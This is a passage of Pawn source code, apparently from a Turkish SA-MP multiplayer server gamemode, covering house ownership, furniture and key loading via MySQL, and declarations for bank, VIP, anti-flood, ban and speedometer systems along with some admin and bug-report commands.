		    strcat(city, SAZones[i][SAZONE_NAME]);
		    return city;
		}
	}

	strcat(city, "San Andreas");
	return city;
}

stock convertNumber(value)
{
	// http://forum.sa-mp.com/showthread.php?p=843781#post843781
    new string[24];
    format(string, sizeof(string), "%d", value);

    for(new i = (strlen(string) - 3); i > (value < 0 ? 1 : 0) ; i -= 3)
    {
        strins(string[i], ",", 0);
    }

    return string;
}

stock RemovePlayerWeapon(playerid, weapon)
{
    new weapons[13], ammo[13];
    for(new i; i < 13; i++) GetPlayerWeaponData(playerid, i, weapons[i], ammo[i]);
    ResetPlayerWeapons(playerid);
    for(new i; i < 13; i++)
    {
        if(weapons[i] == weapon) continue;
        GivePlayerWeapon(playerid, weapons[i], ammo[i]);
    }

    return 1;
}

stock GetXYInFrontOfPlayer(playerid, &Float:x, &Float:y, Float:distance)
{
	new Float: a;
	GetPlayerPos(playerid, x, y, a);
	GetPlayerFacingAngle(playerid, a);
	if (GetPlayerVehicleID(playerid)) GetVehicleZAngle(GetPlayerVehicleID(playerid), a);
	x += (distance * floatsin(-a, degrees));
	y += (distance * floatcos(-a, degrees));
}


stock SendToHouse(playerid, id)
{
    if(!Iter_Contains(Houses, id)) return 0;
    SetPVarInt(playerid, "HousePickupCooldown", gettime() + HOUSE_COOLDOWN);
    InHouse[playerid] = id;
	SetPlayerVirtualWorld(playerid, id);
 	SetPlayerInterior(playerid, HouseInteriors[ HouseData[id][Interiors] ][intID]);
  	SetPlayerPos(playerid, HouseInteriors[ HouseData[id][Interiors] ][intX], HouseInteriors[ HouseData[id][Interiors] ][intY], HouseInteriors[ HouseData[id][Interiors] ][intZ]);

	new string[128];
	format(string, sizeof(string), "%s'in evine hoþ geldiniz, %s{FFFFFF}!", HouseData[id][Owner], HouseData[id][HOName]);
	SendClientMessage(playerid, 0xFFFFFFFF, string);

	if(!strcmp(HouseData[id][Owner], GetName(playerid)))
	{
		HouseData[id][LastEntered] = gettime();
		HouseData[id][Save] = true;
		SendClientMessage(playerid, 0xFFFFFFFF, "{3498DB}/ev {FFFFFF}yazarak ev menüsünü açabilirsiniz..");
	}

	if(HouseData[id][LockMode] == LOCK_MODE_NOLOCK && LastVisitedHouse[playerid] != id)
	{
	    new query[128];
	    mysql_format(Connection, query, sizeof(query), "INSERT INTO housevisitors SET HouseID=%d, Visitor='%e', Date=UNIX_TIMESTAMP()", id, GetName(playerid));
		mysql_tquery(Connection, query, "", "");
		LastVisitedHouse[playerid] = id;
	}

	return 1;
}

stock ShowHouseMenu(playerid)
{
	if(strcmp(HouseData[ InHouse[playerid] ][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");

	new string[256], id = InHouse[playerid];
	format(string, sizeof(string), "Evin adý: %s\nÞifre: %s\nKilit: %s\nEv Kasasý {2ECC71}($%s)\nZiyaretçiler\nAnahtarlar\nHerkesi at\nEvi sat", HouseData[id][HOName], HouseData[id][Password], LockNames[ HouseData[id][LockMode] ], convertNumber(HouseData[id][SafeMoney]));
	ShowPlayerDialog(playerid, DIALOG_HOUSE_MENU, DIALOG_STYLE_LIST, HouseData[id][HOName], string, "Select", "Close");
	return 1;
}

stock ResetHouse(id)
{
    if(!Iter_Contains(Houses, id)) return 0;
	format(HouseData[id][HOName], MAX_HOUSE_NAME, "Satýlýk Ev");
	format(HouseData[id][Owner], MAX_PLAYER_NAME, "-");
	format(HouseData[id][Password], MAX_HOUSE_PASSWORD, "-");
	HouseData[id][LockMode] = LOCK_MODE_NOLOCK;
	HouseData[id][SalePrice] = HouseData[id][SafeMoney] = HouseData[id][LastEntered] = 0;
    HouseData[id][Save] = true;

    new label[200];
    format(label, sizeof(label), "{2ECC71}Satýlýk Ev (ID: %d)\n{FFFFFF}%s\n{F1C40F}Fiyat: {2ECC71}$%s", id, HouseInteriors[ HouseData[id][Interiors] ][IntName], convertNumber(HouseData[id][Price]));
	UpdateDynamic3DTextLabelText(HouseData[id][HouseLabel], 0xFFFFFFFF, label);
	Streamer_SetIntData(STREAMER_TYPE_PICKUP, HouseData[id][HousePickup], E_STREAMER_MODEL_ID, 1273);
	Streamer_SetIntData(STREAMER_TYPE_MAP_ICON, HouseData[id][HouseIcon], E_STREAMER_TYPE, 31);

    foreach(new i : Player)
    {
        if(InHouse[i] == id)
        {
            SetPVarInt(i, "HousePickupCooldown", gettime() + HOUSE_COOLDOWN);
        	SetPlayerVirtualWorld(i, 0);
	        SetPlayerInterior(i, 0);
	        SetPlayerPos(i, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]);
	        InHouse[i] = INVALID_HOUSE_ID;
        }

        if(Iter_Contains(HouseKeys[i], id)) Iter_Remove(HouseKeys[i], id);
   	}

    new query[64], data[e_furniture];
    mysql_format(Connection, query, sizeof(query), "DELETE FROM houseguns WHERE HouseID=%d", id);
    mysql_tquery(Connection, query, "", "");

    for(new i, maxval = Streamer_GetUpperBound(STREAMER_TYPE_OBJECT); i <= maxval; ++i)
    {
        if(!IsValidDynamicObject(i)) continue;
		Streamer_GetArrayData(STREAMER_TYPE_OBJECT, i, E_STREAMER_EXTRA_ID, data);
		if(data[SQLID] > 0 && data[HouseIDsa] == id) DestroyDynamicObject(i);
    }

    mysql_format(Connection, query, sizeof(query), "DELETE FROM housefurnitures WHERE HouseID=%d", id);
    mysql_tquery(Connection, query, "", "");

    mysql_format(Connection, query, sizeof(query), "DELETE FROM housevisitors WHERE HouseID=%d", id);
    mysql_tquery(Connection, query, "", "");

    mysql_format(Connection, query, sizeof(query), "DELETE FROM housekeys WHERE HouseID=%d", id);
    mysql_tquery(Connection, query, "", "");

    mysql_format(Connection, query, sizeof(query), "DELETE FROM housesafelogs WHERE HouseID=%d", id);
    mysql_tquery(Connection, query, "", "");
	return 1;
}

stock SaveHouse(id)
{
    if(!Iter_Contains(Houses, id)) return 0;
	new query[256];
	mysql_format(Connection, query, sizeof(query), "UPDATE houses SET HouseName='%e', HouseOwner='%e', HousePassword='%e', HouseSalePrice=%d, HouseLock=%d, HouseMoney=%d, LastEntered=%d WHERE ID=%d",
	HouseData[id][HOName], HouseData[id][Owner], HouseData[id][Password], HouseData[id][SalePrice], HouseData[id][LockMode], HouseData[id][SafeMoney], HouseData[id][LastEntered], id);
	mysql_tquery(Connection, query, "", "");
	HouseData[id][Save] = false;
	return 1;
}

stock UpdateHouseLabel(id)
{
	if(!Iter_Contains(Houses, id)) return 0;
	new label[256];
	if(!strcmp(HouseData[id][Owner], "-")) {
		format(label, sizeof(label), "{2ECC71}Satýlýk ev (ID: %d)\n{FFFFFF}%s\n{F1C40F}Fiyat: {2ECC71}$%s", id, HouseInteriors[ HouseData[id][Interiors] ][IntName], convertNumber(HouseData[id][Price]));
	}else{
		if(HouseData[id][SalePrice] > 0) {
		    format(label, sizeof(label), "{E67E22}%s'in Satýlýk evi (ID: %d)\n{FFFFFF}%s\n{FFFFFF}%s\n{F1C40F}Fiyat: {2ECC71}$%s", HouseData[id][Owner], id, HouseData[id][HOName], HouseInteriors[ HouseData[id][Interiors] ][IntName], convertNumber(HouseData[id][SalePrice]));
		}else{
			format(label, sizeof(label), "{E67E22}%s'in evi (ID: %d)\n{FFFFFF}%s\n{FFFFFF}%s\n%s\n{FFFFFF}%s", HouseData[id][Owner], id, HouseData[id][HOName], HouseInteriors[ HouseData[id][Interiors] ][IntName], LockNames[ HouseData[id][LockMode] ], HouseData[id][Address]);
		}
	}

	UpdateDynamic3DTextLabelText(HouseData[id][HouseLabel], 0xFFFFFFFF, label);
	return 1;
}

stock House_PlayerInit(playerid)
{
    InHouse[playerid] = LastVisitedHouse[playerid] = INVALID_HOUSE_ID;
    ListPage[playerid] = SelectMode[playerid] = SELECT_MODE_NONE;
    EditingFurniture[playerid] = false;
    LoadHouseKeys(playerid);
	return 1;
}

stock OwnedHouses(playerid)
{
	#if LIMIT_PER_PLAYER != 0
    new count;

	foreach(new i : Houses) if(!strcmp(HouseData[i][Owner], GetName(playerid), true)) count++;
	return count;
	#else
	return 0;
	#endif
}

forward ResetAndSaveHouses();
forward LoadHouses();
forward LoadFurnitures();
forward GiveHouseKeys(playerid);
forward HouseSaleMoney(playerid);

public ResetAndSaveHouses()
{
	foreach(new i : Houses)
	{
	    //if(HouseData[i][LastEntered] > 0 && gettime()-HouseData[i][LastEntered] > 604800) ResetHouse(i);
	    if(HouseData[i][Save]) SaveHouse(i);
	}

	return 1;
}

public LoadHouses()
{
	new rows = cache_num_rows();
 	if(rows)
  	{
   		new id, loaded, for_sale, label[256];
		while(loaded < rows)
		{
  			cache_get_value_name_int(loaded, "ID", id);
	    	cache_get_value_name(loaded, "HouseName", HouseData[id][HOName], .max_len = MAX_HOUSE_NAME);
		    cache_get_value_name(loaded, "HouseOwner", HouseData[id][Owner], .max_len = MAX_PLAYER_NAME);
		    cache_get_value_name(loaded, "HousePassword", HouseData[id][Password], .max_len = MAX_HOUSE_PASSWORD);
	     	cache_get_value_name_float(loaded, "HouseX", HouseData[id][houseX]);
		    cache_get_value_name_float(loaded, "HouseY", HouseData[id][houseY]);
		    cache_get_value_name_float(loaded, "HouseZ", HouseData[id][houseZ]);
		    cache_get_value_name_int(loaded, "HousePrice", HouseData[id][Price]);
		    cache_get_value_name_int(loaded, "HouseSalePrice", HouseData[id][SalePrice]);
		    cache_get_value_name_int(loaded, "HouseInterior", HouseData[id][Interiors]);
		    cache_get_value_name_int(loaded, "HouseLock", HouseData[id][LockMode]);
		    cache_get_value_name_int(loaded, "HouseMoney", HouseData[id][SafeMoney]);
		    cache_get_value_name_int(loaded, "LastEntered", HouseData[id][LastEntered]);
			format(HouseData[id][Address], MAX_HOUSE_ADDRESS, "%d, %s, %s", id, GetZoneName(HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]), GetCityName(HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]));

	        if(strcmp(HouseData[id][Owner], "-")) {
	            if(HouseData[id][SalePrice] > 0) {
	                for_sale = 1;
				    format(label, sizeof(label), "{E67E22}%s'in Satýlýk ev (ID: %d)\n{FFFFFF}%s\n{FFFFFF}%s\n{F1C40F}Fiyat: {2ECC71}$%s", HouseData[id][Owner], id, HouseData[id][HOName], HouseInteriors[ HouseData[id][Interiors] ][IntName], convertNumber(HouseData[id][SalePrice]));
				}else{
				    for_sale = 0;
					format(label, sizeof(label), "{E67E22}%s'in Evi (ID: %d)\n{FFFFFF}%s\n{FFFFFF}%s\n%s\n{FFFFFF}%s", HouseData[id][Owner], id, HouseData[id][HOName], HouseInteriors[ HouseData[id][Interiors] ][IntName], LockNames[ HouseData[id][LockMode] ], HouseData[id][Address]);
				}
			}else{
			    for_sale = 1;
         		format(label, sizeof(label), "{2ECC71}Satýlýk ev (ID: %d)\n{FFFFFF}%s\n{F1C40F}Fiyat: {2ECC71}$%s", id, HouseInteriors[ HouseData[id][Interiors] ][IntName], convertNumber(HouseData[id][Price]));
	        }

			HouseData[id][HousePickup] = CreateDynamicPickup((!for_sale) ? 19522 : 1273, 1, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]);
			HouseData[id][HouseIcon] = CreateDynamicMapIcon(HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ], (!for_sale) ? 32 : 31, 0);
			HouseData[id][HouseLabel] = CreateDynamic3DTextLabel(label, 0xFFFFFFFF, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]+0.35, 15.0, .testlos = 1);
			Iter_Add(Houses, id);
		    loaded++;
	    }

	    printf(" [House System] %d ev yüklendi.", loaded);
	}

	return 1;
}

public LoadFurnitures()
{
	new rows = cache_num_rows();
 	if(rows)
  	{
   		new id, loaded, data[e_furniture];
     	while(loaded < rows)
      	{
   		 	cache_get_value_name_int(loaded, "ID", data[SQLID]);
         	cache_get_value_name_int(loaded, "HouseID", data[HouseIDsa]);
         	cache_get_value_name_int(loaded, "FurnitureID", data[ArrayID]);
          	cache_get_value_name_float(loaded, "FurnitureX", data[furnitureX]);
           	cache_get_value_name_float(loaded, "FurnitureY", data[furnitureY]);
            cache_get_value_name_float(loaded, "FurnitureZ", data[furnitureZ]);
            cache_get_value_name_float(loaded, "FurnitureRX", data[furnitureRX]);
            cache_get_value_name_float(loaded, "FurnitureRY", data[furnitureRY]);
            cache_get_value_name_float(loaded, "FurnitureRZ", data[furnitureRZ]);

			new fvw, fint;
			cache_get_value_name_int(loaded, "FurnitureVW", fvw);
			cache_get_value_name_int(loaded, "FurnitureInt", fint);
			id = CreateDynamicObject(
   				HouseFurnitures[ data[ArrayID] ][ModelID],
       			data[furnitureX], data[furnitureY], data[furnitureZ],
          		data[furnitureRX], data[furnitureRY], data[furnitureRZ],
				fvw, fint
			);
            ObjeSistemde[id] = true;
			Streamer_SetArrayData(STREAMER_TYPE_OBJECT, id, E_STREAMER_EXTRA_ID, data);
   			loaded++;
 		}

 		printf(" [House System] Loaded %d furnitures.", loaded);
   	}

	return 1;
}

public GiveHouseKeys(playerid)
{
	if(!IsPlayerConnected(playerid)) return 1;
	new hauzid;
	new rows = cache_num_rows();
 	if(rows)
  	{
   		new loaded;
     	while(loaded < rows)
      	{
      	    cache_get_value_name_int(loaded, "HouseID", hauzid);
       		Iter_Add(HouseKeys[playerid], hauzid);
   			loaded++;
 		}
   	}

	return 1;
}

public HouseSaleMoney(playerid)
{
    new rows = cache_num_rows();
	new ididi;
 	if(rows)
  	{
   		new new_owner[MAX_PLAYER_NAME], price, string[128];
		for(new i; i < rows; i++)
		{
	    	cache_get_value_name(i, "NewOwner", new_owner);
		    cache_get_value_name_int(i, "Price", price);
			cache_get_value_name_int(i, "ID", ididi);
			format(string, sizeof(string), "Evini %s isimli kiþiye $%s ücretle sattýn. (Ýþlem ID: #%d)", new_owner, convertNumber(price), ididi);
			SendClientMessage(playerid, -1, string);
			//GivePlayerMoney(playerid, price);
            RewardPlayer(playerid, price, 0);
	    }

		new query[128];
	    mysql_format(Connection, query, sizeof(query), "DELETE FROM housesales WHERE OldOwner='%e'", GetName(playerid));
	    mysql_tquery(Connection, query, "", "");
	}

	return 1;
}

// ************************************************************************************************************************************************************
// Arkadaþlýk Sistemi [ XpDevil ]
// ************************************************************************************************************************************************************
#define MAX_ARKADAS 20 			// Bir oyuncunun sahip olacaðý en fazla arkadaþ sayýsý
#define MAX_GRUP 1000 			// Oyunda olabilecek en fazla sohbet grubu sayýsý
#define MAX_GRUP_KATILIMCI 40 	// Bir grupta olabilecek en fazla oyuncu sayýsý
#define ARK_DIALOG 3500 		// Eðer dialoglar baþka bir dialog ile çakýþýrsa, bu ID'yi deðiþtirmeniz yeterli olacaktýr.

new arkList[MAX_PLAYERS][MAX_ARKADAS][24];

enum gData
{
	g_Var,
	g_isim[24],
	g_kurucu[24]
};
new grupVeri[MAX_GRUP][gData];
new grupOyn[MAX_GRUP][MAX_GRUP_KATILIMCI][24];

// ************************************************************************************************************************************************************
// Anti Flood Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
//new SonMesajTick[MAX_PLAYERS];
new MesajSustur[MAX_PLAYERS];

new KomutDurdur[MAX_PLAYERS];
new //SonKomutTick[MAX_PLAYERS],
	YazilanKomut[MAX_PLAYERS];

new DurumDurdur[MAX_PLAYERS];
new //SonDurumTick[MAX_PLAYERS],
	DegisenDurum[MAX_PLAYERS];

new OlumDurdur[MAX_PLAYERS];
new //SonOlumTick[MAX_PLAYERS],
	OlumSayisi[MAX_PLAYERS];

new DialogDurdur[MAX_PLAYERS];
new //SonDialogTick[MAX_PLAYERS],
	DialogSayisi[MAX_PLAYERS];

new SpawnDurdur[MAX_PLAYERS];
new //SonSpawnTick[MAX_PLAYERS],
	SpawnSayisi[MAX_PLAYERS];

new ReqSpawnDurdur[MAX_PLAYERS],
	ReqSpawnSayisi[MAX_PLAYERS];

new ModControlTimer;

new LastConnectedIP[50];
new ConnectedCount;

// ************************************************************************************************************************************************************
// VIP Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
new VIP[MAX_PLAYERS],
	YVIP[MAX_PLAYERS];
new VIPBitis[MAX_PLAYERS][20];



// ************************************************************************************************************************************************************
// AirBalloon Sistemi [ Yapýmcý:Flovv(Forum SA:MP) Uyarlama:EvoturK ]
// ************************************************************************************************************************************************************
new bool:Balonda[MAX_PLAYERS],
	BalonObje[MAX_PLAYERS][3];

// ************************************************************************************************************************************************************
// Banka Sistemi [ Yapýmcý:rootcause(Forum SA:MP) ]
// ************************************************************************************************************************************************************
#define     ACCOUNT_PRICE           (5000)      	// Banka hesabý açmak için gereken para
#define     ACCOUNT_CLIMIT          (10)         // Oyuncu baþýna açýlabilecek hesap limiti
#define     ACCOUNT_LIMIT           (800000000) // Banka hesabýnda bulundurulabilecek para limiti ( 800M $ )

enum    _:E_BANK_DIALOG
{
    DIALOG_BANK_MENU_NOLOGIN = 12450,
    DIALOG_BANK_MENU,
    DIALOG_BANK_CREATE_ACCOUNT,
    DIALOG_BANK_ACCOUNTS,
    DIALOG_BANK_LOGIN_ID,
	DIALOG_BANK_LOGIN_PASS,
	DIALOG_BANK_DEPOSIT,
	DIALOG_BANK_WITHDRAW,
	DIALOG_BANK_TRANSFER_1,
	DIALOG_BANK_TRANSFER_2,
	DIALOG_BANK_PASSWORD,
	DIALOG_BANK_REMOVE,
	DIALOG_BANK_LOGS,
	DIALOG_BANK_LOG_PAGE
}

enum    _:E_BANK_LOGTYPE
{
	TYPE_NONE,
	TYPE_LOGIN,
	TYPE_DEPOSIT,
	TYPE_WITHDRAW,
	TYPE_TRANSFER,
	TYPE_PASSCHANGE
}

new
	MySQL:BankSQLHandle;

new
	CurrentAccountID[MAX_PLAYERS] = {-1, ...},
	LogListType[MAX_PLAYERS] = {TYPE_NONE, ...},
	LogListPage[MAX_PLAYERS];

// ************************************************************************************************************************************************************
// MySQL Ban Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
enum BanReasonInfo
{
	BRName[40],
	BRGun
};

new BanReason[4][BanReasonInfo]={
//Sebep                                 Süre(Gün)
{"Hile Kullanýmý", 						1},
{"Þahýsa Küfür", 						1},
{"Ailevi Küfür", 						3},
{"Admine Saygýsýzlýk/Hakaret",			2}
};

// ************************************************************************************************************************************************************
// Donator Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
#define DONATOR_DIZIN                       "ServerData/Donator"
#define MAX_DONATOR                         200

enum DonInfos
{
	DonName[30],
	Float:DonX,
	Float:DonY,
	Float:DonZ,
	Text3D:Don3D,
	DonExist
};

new Don[MAX_DONATOR][DonInfos];

new Iterator:DONs<MAX_DONATOR>;

// ************************************************************************************************************************************************************
// Anti Teleport Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
//new Float:SonOyuncuPos[MAX_PLAYERS][3];
//new BirSureBakmaTamam[MAX_PLAYERS];


// ************************************************************************************************************************************************************
// Saklý Kasa Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
new SakliKasaAldi[MAX_PLAYERS][30];
new SakliKasaTamam[MAX_PLAYERS];
new SakliKasaTasiyor[MAX_PLAYERS];

new SakliKasaTrailer[30];
new TrailerSakliKasa[MAX_VEHICLES];
new Float:SakliKasalar[30][4]={
{165.8933,-1877.0974,3.2345,359.6581}, // 1
{1106.4801,-2069.4873,70.0249,180.0454}, // 2
{2540.2275,-2049.2888,5.8845,269.7130}, // 3  1454.1627,1144.8380,7.1875,91.3992
{2815.2725,-1419.6864,17.2622,89.4917}, // 4
{2935.1599,-2051.7942,4.5672,90.1848}, // 5
{2805.8149,-2455.8140,14.6485,180.2015}, // 6
{1804.7119,-2296.5947,-1.5258,179.9031}, // 7
{170.0521,-3759.4370,14.8234,317.3492}, // 8   159.8313,-3748.7087,14.8276,316.6701
{4414.6211,664.9884,12.2719,269.7802}, // 9
{5517.8682,-3016.7488,13.7947,88.6593}, // 10
{-5202.3340,1368.1194,46.8093,341.9518}, // 11
{-2495.5063,324.0851,32.1352,339.5770}, // 12
{-2927.2358,822.5326,7.0690,167.1747}, //13
{-2708.9365,1472.6876,8.1728,179.1103}, //14
{-1696.3004,1059.1023,18.6040,88.3358}, // 15
{-2175.9573,652.5638,50.4563,179.9270}, // 16
{-1512.1843,149.8746,4.5753,44.4423}, // 17
{-2532.1833,-691.7635,140.3299,269.8487}, // 18
{-1361.3539,-79.3133,7.3597,358.3501}, // 19
{-2826.9600,-1523.6276,140.2380,0.8462}, //20
{1107.1301,1605.3995,6.8494,256.6974}, // 21
{2412.3606,2533.6819,22.8921,359.4145}, // 22    1157.9760,2857.1592,11.8475,74.9830
{2611.9067,2854.0393,11.8399,89.2844}, // 23
{2495.8782,2397.3567,5.2284,268.4988}, // 24
{2894.8396,1611.8156,11.8387,359.1461}, // 25
{2475.5852,1159.6089,11.8361,270.3968}, // 26
{-79.9822,1129.6943,20.7619,179.6971}, // 27
{-339.0904,1616.0614,76.4653,223.9542}, // 28
{-1301.1771,2511.4233,88.0841,185.3242}, // 29
{-2534.7075,2360.6089,5.9962,269.4580} // 30
};

// ************************************************************************************************************************************************************
// SpeedoMeter Sistemi [ EvoturK ] [ Yeni Speedo ]
// ************************************************************************************************************************************************************
new PlayerText:Speedo_Name[MAX_PLAYERS],
	PlayerText:Speedo_Name1[MAX_PLAYERS],
	PlayerText:Speedo_a1[MAX_PLAYERS],
	PlayerText:Speedo_a2[MAX_PLAYERS],
	PlayerText:Speedo_a3[MAX_PLAYERS],
	PlayerText:Speedo_a4[MAX_PLAYERS],
	PlayerText:Speedo_a5[MAX_PLAYERS],
	PlayerText:Speedo_petrol[MAX_PLAYERS],
	PlayerText:Speedo_kemer[MAX_PLAYERS],
	PlayerText:Speedo_jant[MAX_PLAYERS],
	PlayerText:Speedo_vciz[MAX_PLAYERS],
	PlayerText:Speedo_fix[MAX_PLAYERS],
	PlayerText:Speedo_Speed[MAX_PLAYERS],
	PlayerText:Speedo_Damage[MAX_PLAYERS],
	PlayerText:Speedo_Vites[MAX_PLAYERS],
	PlayerText:Speedo_Motor[MAX_PLAYERS],
	PlayerText:Speedo_Fuel[MAX_PLAYERS],
	Text:Speedo_Text[5];

// ************************************************************************************************************************************************************
// Ahýr Sistemi & Animasyonlar [ EvoturK ]
// ************************************************************************************************************************************************************
new AhirKurban[MAX_PLAYERS];
new Ahirin[MAX_PLAYERS];

// ************************************************************************************************************************************************************
// Random Server HostName [ EvoturK ]
// ************************************************************************************************************************************************************
new RandomServerHostName[1][128]={
"» Canakkale Meslek - Turkiye U7 - 0.3.7 - MESLEK SUNUCUSU"
/*"» Canakkale Meslek - Turkiye - U3 1 MAYIS HERKES VIP",
"» Canakkale Meslek - Turkiye - 0.3.7 - 23 NÝSAN VIP",
"» Canakkale Meslek - Turkiye - 0.3.7 - 23 NÝSAN VIP",
"» Canakkale Meslek - Turkiye - 0.3.7 - 23 NÝSAN VIP"*/
};
/*new RandomServerHostName[5][128]={
"» Canakkale Meslek - Turkiye - 0.3.7 - 23 NÝSAN VIP",
"» Canakkale Meslek - Turkiye - 0.3.7 - 23 NÝSAN VIP",
"» Canakkale Meslek - Turkiye - 0.3.7 - 23 NÝSAN VIP",
"» Canakkale Meslek - Turkiye - 0.3.7 - 23 NÝSAN VIP",
"» Canakkale Meslek - Turkiye - 0.3.7 - 23 NÝSAN VIP"
};*/

new RandomServerHostName2[3][128]={
"» Canakkale Meslek - [V5.1.1 U7] Maintenance ",
"» Canakkale Meslek - [V5.1.1 U7] BAKIM MODU ",
"» Turkiye'nin Tek Kamyonculuk Sunucusu ( BAKIM )"
};

new RandomSHNTimer;

// =========================== Bug Report Sistemi ==============================
CMD:bildirim(playerid, params[])
{
    event(params);
	return 1;
}
CMD:bugbildir(playerid, params[])
{
  return cmd_bugreport(playerid, params);
}

CMD:bugreport(playerid, params[])
{
	SendAdminText(playerid, "/bugreport", params);
	new bugYazi[1024];
    if(sscanf(params, "s[128]", bugYazi))return SendSyntaxMessage(playerid, "/bugreport <Bug Açýklamasý>");
    else
    {
		if(bugBildirdi[playerid] == 1)return SendClientMessage(playerid, COLOR_REDS, "« [!] HATA »:{FFFFFF}5 Dakikada bir kere bug bildirebilirsin.");
        if(strlen(bugYazi) > 64)return SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}Açýklamanýz en fazla 64 karakter içerebilir.");

		new gun, ay, yil, saat, dakika, saniye;
		getdate(yil, ay, gun);
		gettime(saat, dakika, saniye);
		new tarih[128];
		format(tarih, 128, "%d.%d.%d %d:%d:%d", gun, ay, yil, saat, dakika, saniye);


		new handle = SQL::Open(SQL::INSERT, "bugbildirimleri");

		SQL::WriteString(handle, "bugBildiren", GetName(playerid));
	 	SQL::WriteString(handle, "bugAciklamasi", bugYazi);
	 	SQL::WriteString(handle, "bugBildirmeTarih", tarih);

	    SQL::Close(handle);

        bugBildirdi[playerid] = 1;
	    SetTimerEx("BugBildirdi", 300*1000, false, "i", playerid);

		SendServerMessage(playerid, "Bug Baþarýyla sisteme bildirildi!");
	}

	return 1;
}
//forward DestroyVehicleEx(&vehicleid);
public DestroyVehicleEx(&vehicleid)
{
if(vehicleid != INVALID_VEHICLE_ID && vehicleid > 0 && vehicleid <= 2000){
for(new i;i<objecount[vehicleid];i++){
DestroyDynamicObject(ob[vehicleid][i]);
}
DestroyVehicle(vehicleid);
objecount[vehicleid]=0;
vehicleid = INVALID_VEHICLE_ID;
}
return 1;
}

forward BugBildirdi(playerid);
public BugBildirdi(playerid)
{
     bugBildirdi[playerid] = 0;
    return 1;
}
CMD:bugbildirimleri(playerid, params[])
{
    if(APlayerData[playerid][PlayerLevel] >= 2 || Root[playerid] == 1)
    {
	    new query[128], Cache:result;
		mysql_format(Connection, query, sizeof(query),"SELECT * FROM `bugbildirimleri`");
		result = mysql_query(Connection, query);
		new rows;
		cache_get_row_count(rows);
		cache_delete(result);
		if(rows > 0)
		{
		    SendClientMessage(playerid, -1, "{FF0000}« [!] HATA »:{FFFFFF} Sistemde bildirilmiþ bug mevcut ayrýntýlarý forum admin panelinden görüntüleyebilirsiniz.");
		}else{
		    SendServerMessage(playerid, "Sistemde bildirilmiþ bir bug mevcut deðil!");
		}
	}else return SendErrorMessage(playerid, "Yetkiniz yeterli deðil!");

	return 1;
}

// =============================================================================


// ************************************************************************************************************************************************************
// Metin ile Sabah Sabah Delirmeceler [ EvoturK ]
// ************************************************************************************************************************************************************
new GAPI[2]; // Anadolu Island GAPIlarý

new pSkin[MAX_PLAYERS];

new GaleriKaydet;

new EvIsyeriKaydet;

CMD:clientmode(playerid, params[])
{
    SendAdminText(playerid, "/clientmode", params);
    if(APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1)
    {
	    if(ClientMode == 0)
	    {
	        SendServerMessageToAll("Sunucu client giriþi modundan çýkartýldý!");
	        ClientMode = 0;
		}else
		if(ClientMode == 0)
		{
		    SendServerMessageToAll("Sunucu client giriþi moduna girdi");
		    ClientMode = 0;
		}
	}else return SendClientMessage(playerid, -1, "Yetkiniz yeterli deðil");
	return 1;
}


CMD:afisyerisil(playerid , params[])
{
    new Msg[128];

 	SendAdminText(playerid, "/afisyerisil", params);

    if(APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1)
    {
		for (new BusID = 0; BusID < MAX_BUSINESS; BusID++)
		{
		    if(ABusinessData[BusID][Owned] == false)
		    {
		        ABusinessData[BusID][BusinessName] = 0;
		        ABusinessData[BusID][BusinessX] = 0.0;
		        ABusinessData[BusID][BusinessY] = 0.0;
		        ABusinessData[BusID][BusinessZ] = 0.0;
		        ABusinessData[BusID][BusinessType] = 0;
		        ABusinessData[BusID][BusinessLevel] = 0;
		        ABusinessData[BusID][LastTransaction] = 0;
	            ABusinessData[BusID][Owned] = false;
		        ABusinessData[BusID][Owner] = 0;
		        // Destroy the mapicon, 3DText and pickup for the house
			    DestroyDynamicPickup(ABusinessData[BusID][PickupID]);
	            DestroyDynamicMapIcon(ABusinessData[BusID][MapIconID]);
	            DestroyDynamic3DTextLabel(ABusinessData[BusID][DoorText]);
	            ABusinessData[BusID][PickupID] = 0;
	            ABusinessData[BusID][MapIconID] = 0;

                SQL::DeleteRow("isyerleri", "ID", BusID);

				format(Msg,128,"[BOS ISYERI]SILEN : %s - SILINEN ISYERI : %d-%s ",GetName(playerid),BusID,ABusinessData[BusID][BusinessName]);
				ISYERILOG(Msg);
		    }
    	}
	}

return 1;
}



CMD:developer(playerid , params[])
{
	new y[255];
	format(y,255,"Gorev BaslangicID : %d ",APlayerData[playerid][JobLoc1]);
	SendClientMessage(playerid,-1,y);
	format(y,255,"Gorev BaslangicID : %d ",APlayerData[playerid][JobLoc2]);
	SendClientMessage(playerid,-1,y);

	format(y,255,"XXXGorev BaslangicID : %i ",APlayerData[playerid][JobLoc1]);
	SendClientMessage(playerid,-1,y);
	format(y,255,"XXXXGorev BaslangicID : %i ",APlayerData[playerid][JobLoc2]);
	SendClientMessage(playerid,-1,y);

return 1;
}
/*CMD:v5yenilikler(playerid, params[])
{
new YenilikYazi[20004];

	//format(YenilikYazi, 2000, "%s{DDDDDD}({ADFF2F}Canakkale Meslek Sunucusu V5.0.0{DDDDDD})\n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Yeni giriþ ekraný tasarlandý-kodlandý.\n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Kargocu mesleði getirildi.\n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Dolmuþ þöförü mesleði getirildi.\n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Galeri sistemi eklendi.\n", YenilikYazi);
	format(YenilikYazi, 20004, "%s{DDDDDD} Telefon sistemi eklendi (Y Tuþu).\n", YenilikYazi);
